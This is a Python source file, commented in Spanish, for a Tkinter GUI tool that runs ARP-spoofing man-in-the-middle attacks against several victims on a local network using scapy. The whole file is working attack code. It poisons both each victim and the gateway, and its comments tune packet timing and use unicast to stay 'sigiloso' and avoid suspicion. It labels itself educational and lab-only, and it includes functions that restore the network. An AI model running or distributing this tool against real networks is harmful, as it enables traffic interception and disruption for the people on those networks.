
import tkinter as tk
from tkinter import scrolledtext, messagebox
from scapy.all import ARP, Ether, send, srp
import time
import threading
import uuid
import os
import random
import sys

# ============== CONFIGURACIÓN GLOBAL ==============
ip_puerta_enlace = None
mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])

# Diccionario thread-safe para múltiples objetivos
objetivos = {}
objetivos_lock = threading.Lock()

# Lock para log
log_lock = threading.Lock()

# Flag global de sistema
sistema_activo = True

# ============== FUNCIONES DE RED OPTIMIZADAS ==============

def obtener_mac(ip, retries=3):
    """Obtiene MAC con reintentos agresivos pero rápidos"""
    for _ in range(retries):
        try:
            solicitud_arp = ARP(pdst=ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            paquete = ether / solicitud_arp
            resultado = srp(paquete, timeout=2, verbose=0)[0]
            for _, recibido in resultado:
                return recibido.hwsrc
        except Exception:
            pass
        time.sleep(0.3)
    return None

def obtener_puerta_enlace():
    """Obtiene gateway de forma robusta"""
    try:
        # Intentar múltiples métodos
        gateway = os.popen("ip route | grep default | awk '{print $3}' | head -n1").read().strip()
        if gateway:
            return gateway
        # Fallback para otros sistemas
        gateway = os.popen("route -n | grep '^0.0.0.0' | awk '{print $2}' | head -n1").read().strip()
        return gateway
    except:
        return None

def verificar_root():
    """Verifica root de forma multiplataforma"""
    try:
        return os.geteuid() == 0
    except AttributeError:
        # Windows - no necesita root pero sí permisos especiales
        return True

# ============== ATAQUE MULTI-OBJETIVO EFICIENTE ==============

def ataque_eficiente(ip_objetivo, mac_objetivo, evento_stop, widget_salida, nombre):
    """
    Ataque ARP ultra-eficiente y sigiloso
    Balance entre velocidad y sigilo
    """
    global ip_puerta_enlace, mac_atacante

    paquetes_enviados = 0
    errores_consecutivos = 0

    # Cachear MAC de gateway para no preguntar tanto
    mac_gateway = obtener_mac(ip_puerta_enlace)
    if not mac_gateway:
        with log_lock:
            widget_salida.insert(tk.END, f"[{nombre}] ❌ ERROR: No se pudo obtener MAC de gateway\n")
            widget_salida.see(tk.END)
        return

    try:
        while not evento_stop.is_set() and errores_consecutivos < 5:
            try:
                # === CONFIGURACIÓN ÓPTIMA ===
                # Intervalo: 2-5 segundos (rápido pero no sospechoso)
                intervalo = random.uniform(2.0, 5.0)

                # Enviar siempre 2 paquetes (objetivo + gateway) - eficiente
                # Paquete 1: Envenenar objetivo (somos gateway)
                send(ARP(
                    pdst=ip_objetivo,
                    hwdst=mac_objetivo,
                    psrc=ip_puerta_enlace,
                    hwsrc=mac_atacante,
                    op=2
                ), verbose=0)

                # Pequeño micro-sleep para no saturar
                time.sleep(0.05)

                # Paquete 2: Envenenar gateway (somos objetivo)
                # USAR UNICAST a MAC de gateway (mucho más sigiloso)
                send(ARP(
                    pdst=ip_puerta_enlace,
                    hwdst=mac_gateway,  # Unicast específico
                    psrc=ip_objetivo,
                    hwsrc=mac_atacante,
                    op=2
                ), verbose=0)

                paquetes_enviados += 2
                errores_consecutivos = 0  # Resetear errores

                # Log cada 3 ciclos para no saturar la interfaz
                if paquetes_enviados % 6 == 0:
                    with log_lock:
                        widget_salida.insert(tk.END, 
                            f"[{nombre}] ✓ Activo | {ip_objetivo} <-> {ip_puerta_enlace} | "
                            f"Pkt:{paquetes_enviados}\n")
                        widget_salida.see(tk.END)

                # Esperar con manejo de evento
                evento_stop.wait(intervalo)

            except Exception as e:
                errores_consecutivos += 1
                with log_lock:
                    widget_salida.insert(tk.END, f"[{nombre}] ⚠ Error ({errores_consecutivos}/5): {str(e)[:30]}\n")
                    widget_salida.see(tk.END)
                time.sleep(1)

    finally:
        # RESTAURACIÓN GARANTIZADA
        with log_lock:
            widget_salida.insert(tk.END, f"[{nombre}] 🔄 Restaurando conexión...\n")
            widget_salida.see(tk.END)

        restaurar_eficiente(ip_objetivo, mac_objetivo, mac_gateway, widget_salida, nombre)

def restaurar_eficiente(ip_objetivo, mac_objetivo, mac_gateway, widget_salida, nombre):
    """Restauración rápida y efectiva"""
    global ip_puerta_enlace

    try:
        # Enviar 5 ráfagas de restauración con intervalo corto
        for _ in range(5):
            # Restaurar objetivo
            send(ARP(
                pdst=ip_objetivo,
                hwdst=mac_objetivo,
                psrc=ip_puerta_enlace,
                hwsrc=mac_gateway,
                op=2
            ), verbose=0)

            time.sleep(0.1)

            # Restaurar gateway
            send(ARP(
                pdst=ip_puerta_enlace,
                hwdst=mac_gateway,
                psrc=ip_objetivo,
                hwsrc=mac_objetivo,
                op=2
            ), verbose=0)

            time.sleep(0.4)

        with log_lock:
            widget_salida.insert(tk.END, f"[{nombre}] ✅ RESTAURADO correctamente\n")
            widget_salida.see(tk.END)
    except Exception as e:
        with log_lock:
            widget_salida.insert(tk.END, f"[{nombre}] ⚠ Error restaurando: {e}\n")
            widget_salida.see(tk.END)

# ============== CONTROLADORES DE LA GUI ==============

def agregar_objetivo():
    """Agrega objetivo de forma segura"""
    global objetivos, ip_puerta_enlace

    ip = entrada_ip.get().strip()
    nombre = entrada_nombre.get().strip() or f"Obj_{len(objetivos)+1}"

    # Validaciones estrictas
    if not ip:
        messagebox.showwarning("Error", "Ingrese una IP")
        return

    if ip == ip_puerta_enlace:
        messagebox.showerror("Error", "No puede atacar la gateway")
        return

    # Validar formato IP
    try:
        octetos = ip.split('.')
        if len(octetos) != 4 or not all(o.isdigit() and 0 <= int(o) <= 255 for o in octetos):
            raise ValueError
    except:
        messagebox.showwarning("Error", "IP inválida (ej: 192.168.1.10)")
        return

    with objetivos_lock:
        if ip in objetivos:
            messagebox.showwarning("Error", "IP ya existe en la lista")
            return

    # Verificar conectividad
    log_message(f"🔍 Escaneando {ip}...")
    ventana.update()

    mac = obtener_mac(ip)
    if not mac:
        messagebox.showwarning("No responde", 
            f"{ip} no responde a ARP.\nVerifique que esté online.")
        return

    # Agregar a diccionario
    with objetivos_lock:
        objetivos[ip] = {
            'nombre': nombre,
            'mac': mac,
            'evento': threading.Event(),
            'hilo': None,
            'activo': False
        }

    entrada_ip.delete(0, tk.END)
    entrada_nombre.delete(0, tk.END)
    log_message(f"✅ {nombre}: {ip} ({mac}) agregado")
    actualizar_lista_gui()

def iniciar_ataque_ip(ip):
    """Inicia ataque a IP específica"""
    global objetivos

    with objetivos_lock:
        if ip not in objetivos or objetivos[ip]['activo']:
            return

        datos = objetivos[ip]
        datos['activo'] = True
        datos['evento'].clear()

        # Crear hilo daemon
        hilo = threading.Thread(
            target=ataque_eficiente,
            args=(ip, datos['mac'], datos['evento'], widget_salida, datos['nombre']),
            daemon=True
        )
        datos['hilo'] = hilo
        hilo.start()

    log_message(f"🚀 [{objetivos[ip]['nombre']}] ATAQUE INICIADO")
    actualizar_lista_gui()

def detener_ataque_ip(ip):
    """Detiene ataque de forma segura"""
    global objetivos

    with objetivos_lock:
        if ip not in objetivos or not objetivos[ip]['activo']:
            return

        datos = objetivos[ip]
        datos['activo'] = False
        datos['evento'].set()  # Señal de parada

        # Esperar a que termine (timeout 5s)
        if datos['hilo'] and datos['hilo'].is_alive():
            hilo_temp = datos['hilo']
        else:
            hilo_temp = None

    # Esperar fuera del lock
    if hilo_temp:
        hilo_temp.join(timeout=5)

    log_message(f"🛑 [{objetivos[ip]['nombre']}] Detenido")
    actualizar_lista_gui()

def eliminar_objetivo(ip):
    """Elimina objetivo del sistema"""
    global objetivos

    with objetivos_lock:
        if ip not in objetivos:
            return

        datos = objetivos[ip]
        nombre = datos['nombre']

        if datos['activo']:
            datos['activo'] = False
            datos['evento'].set()
            if datos['hilo'] and datos['hilo'].is_alive():
                datos['hilo'].join(timeout=3)

        del objetivos[ip]

    log_message(f"🗑 {nombre} eliminado")
    actualizar_lista_gui()

def iniciar_todos():
    """Inicia todos los ataques"""
    with objetivos_lock:
        ips = list(objetivos.keys())

    count = 0
    for ip in ips:
        with objetivos_lock:
            if ip in objetivos and not objetivos[ip]['activo']:
                iniciar_ataque_ip(ip)
                count += 1
                time.sleep(0.3)  # Staggered start

    if count == 0:
        messagebox.showinfo("Info", "No hay objetivos inactivos")
    else:
        log_message(f"▶️ {count} ataques iniciados")

def detener_todos():
    """Detiene todos los ataques"""
    with objetivos_lock:
        ips = [ip for ip, d in objetivos.items() if d['activo']]

    for ip in ips:
        detener_ataque_ip(ip)
        time.sleep(0.2)

    if ips:
        log_message(f"⏹ {len(ips)} ataques detenidos")

def emergencia_total():
    """Restauración de emergencia masiva"""
    global ip_puerta_enlace

    log_message("\n" + "="*40)
    log_message("🚨 EMERGENCIA - RESTAURANDO RED")
    log_message("="*40)

    detener_todos()
    time.sleep(1)

    mac_gw = obtener_mac(ip_puerta_enlace)
    if not mac_gw:
        log_message("❌ No se pudo obtener MAC de gateway")
        return

    with objetivos_lock:
        items = list(objetivos.items())

    for ip, datos in items:
        try:
            mac_obj = datos['mac']
            # Ráfaga intensiva de restauración
            for _ in range(8):
                send(ARP(pdst=ip, hwdst=mac_obj, psrc=ip_puerta_enlace, hwsrc=mac_gw, op=2), verbose=0)
                send(ARP(pdst=ip_puerta_enlace, hwdst=mac_gw, psrc=ip, hwsrc=mac_obj, op=2), verbose=0)
                time.sleep(0.2)
            log_message(f"✅ {datos['nombre']} restaurado")
        except Exception as e:
            log_message(f"❌ Error con {datos['nombre']}: {e}")

    log_message("="*40)
    log_message("✅ EMERGENCIA COMPLETADA\n")
    messagebox.showinfo("Listo", "Red restaurada")

# ============== FUNCIONES DE GUI ==============

def log_message(msg):
    """Log thread-safe"""
    with log_lock:
        widget_salida.insert(tk.END, msg + "\n")
        widget_salida.see(tk.END)

def actualizar_lista_gui():
    """Actualiza la lista visual"""
    # Limpiar
    for widget in frame_lista.winfo_children():
        widget.destroy()

    with objetivos_lock:
        if not objetivos:
            tk.Label(frame_lista, text="Sin objetivos. Agregue IPs arriba.", 
                    fg="gray", bg="white").pack(pady=20)
            return

        items = list(objetivos.items())

    for ip, d in items:
        color = "#90EE90" if d['activo'] else "#F0F0F0"
        estado = "🟢 ATACANDO" if d['activo'] else "⚪ INACTIVO"

        frame = tk.Frame(frame_lista, bg=color, padx=5, pady=2, relief=tk.RIDGE, bd=1)
        frame.pack(fill=tk.X, pady=1)

        tk.Label(frame, text=f"{d['nombre']} | {ip} | {d['mac']} | {estado}", 
                bg=color, width=60, anchor="w", font=("Consolas", 9)).pack(side=tk.LEFT)

        btn_frame = tk.Frame(frame, bg=color)
        btn_frame.pack(side=tk.RIGHT)

        if d['activo']:
            tk.Button(btn_frame, text="⏹", bg="orange", width=3,
                     command=lambda i=ip: detener_ataque_ip(i)).pack(side=tk.LEFT, padx=1)
        else:
            tk.Button(btn_frame, text="▶", bg="lightgreen", width=3,
                     command=lambda i=ip: iniciar_ataque_ip(i)).pack(side=tk.LEFT, padx=1)

        tk.Button(btn_frame, text="🗑", fg="red", width=3,
                 command=lambda i=ip: eliminar_objetivo(i)).pack(side=tk.LEFT, padx=1)

def on_closing():
    """Cierre seguro"""
    with objetivos_lock:
        activos = sum(1 for d in objetivos.values() if d['activo'])

    if activos > 0:
        resp = messagebox.askyesnocancel("Salir", 
            f"Hay {activos} ataques activos.\n¿Restaurar antes de salir?\n"
            "(Si=Restaurar y salir, No=Salir directo, Cancelar=Quedarse)")

        if resp is True:
            emergencia_total()
            ventana.destroy()
        elif resp is False:
            ventana.destroy()
    else:
        ventana.destroy()

# ============== SETUP INICIAL ==============

def inicializar():
    global ip_puerta_enlace

    if not verificar_root():
        messagebox.showerror("ERROR", "Ejecutar como root:\nsudo python3 script.py")
        sys.exit(1)

    ip_puerta_enlace = obtener_puerta_enlace()
    if not ip_puerta_enlace:
        messagebox.showerror("ERROR", "No se detectó gateway")
        sys.exit(1)

    label_gw.config(text=f"Gateway: {ip_puerta_enlace} | Tu MAC: {mac_atacante}")

    log_message("="*50)
    log_message("🔒 ARP SPOOFING - MULTI OBJETIVO (EDUCATIVO)")
    log_message("="*50)
    log_message(f"✓ Gateway: {ip_puerta_enlace}")
    log_message(f"✓ MAC local: {mac_atacante}")
    log_message(f"✓ Privilegios: OK")
    log_message("\n📋 INSTRUCCIONES:")
    log_message("1. Agregar IP de víctima")
    log_message("2. Click en ▶ para iniciar ataque individual")
    log_message("3. Click en ⏹ para detener")
    log_message("4. 🗑 para eliminar de la lista")
    log_message("\n⚠️  SOLO USO EDUCATIVO EN LABORATORIO\n")

# ============== INTERFAZ ==============

ventana = tk.Tk()
ventana.title("ARP Spoofing Multi-Objetivo - Laboratorio")
ventana.geometry("800x650")

# Header
tk.Label(ventana, text="🎓 HERRAMIENTA EDUCATIVA - LABORATORIO CONTROLADO", 
        bg="#2c3e50", fg="white", font=("Arial", 11, "bold"), pady=10).pack(fill=tk.X)

label_gw = tk.Label(ventana, text="Inicializando...", bg="#34495e", fg="#ecf0f1", pady=5)
label_gw.pack(fill=tk.X)

# Input frame
frame_input = tk.LabelFrame(ventana, text="Nuevo Objetivo", padx=10, pady=10)
frame_input.pack(pady=10, padx=10, fill=tk.X)

tk.Label(frame_input, text="IP:").grid(row=0, column=0)
entrada_ip = tk.Entry(frame_input, width=18, font=("Consolas", 10))
entrada_ip.grid(row=0, column=1, padx=5)
entrada_ip.insert(0, "192.168.1.")

tk.Label(frame_input, text="Nombre:").grid(row=0, column=2)
entrada_nombre = tk.Entry(frame_input, width=15, font=("Consolas", 10))
entrada_nombre.grid(row=0, column=3, padx=5)

tk.Button(frame_input, text="➕ Agregar", command=agregar_objetivo, 
         bg="#3498db", fg="white", font=("Arial", 9, "bold")).grid(row=0, column=4, padx=10)

# Lista frame
frame_lista_container = tk.LabelFrame(ventana, text="Objetivos", padx=5, pady=5)
frame_lista_container.pack(pady=5, padx=10, fill=tk.X)

frame_lista = tk.Frame(frame_lista_container, bg="white")
frame_lista.pack(fill=tk.X)

# Controles
tk.Button(ventana, text="▶️ Iniciar Todos", command=iniciar_todos, 
         bg="#27ae60", fg="white", width=15).pack(pady=2)
tk.Button(ventana, text="⏹️ Detener Todos", command=detener_todos, 
         bg="#f39c12", fg="white", width=15).pack(pady=2)
tk.Button(ventana, text="🚨 RESTAURAR EMERGENCIA", command=emergencia_total, 
         bg="#e74c3c", fg="white", width=25, font=("Arial", 9, "bold")).pack(pady=5)

# Log
frame_log = tk.LabelFrame(ventana, text="Log", padx=5, pady=5)
frame_log.pack(pady=5, padx=10, fill=tk.BOTH, expand=True)

widget_salida = scrolledtext.ScrolledText(frame_log, width=90, height=20, 
                                         font=("Consolas", 9), bg="#2c3e50", fg="#00ff00")
widget_salida.pack(fill=tk.BOTH, expand=True)

# Setup
ventana.protocol("WM_DELETE_WINDOW", on_closing)
inicializar()

ventana.mainloop()
